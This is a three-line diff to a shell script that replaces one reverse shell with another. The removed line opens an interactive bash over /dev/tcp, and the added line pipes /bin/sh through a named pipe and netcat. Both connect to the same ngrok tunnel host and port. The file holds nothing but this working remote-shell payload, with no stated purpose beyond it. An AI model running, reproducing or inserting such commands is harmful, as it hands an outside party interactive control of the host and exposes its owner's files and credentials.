@@ -1,3 +1,3 @@
-#!/bin/bash
+#!/bin/sh
 
-bash -c "bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/17416 0>&1"
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 0.tcp.ap.ngrok.io 17416 >/tmp/f
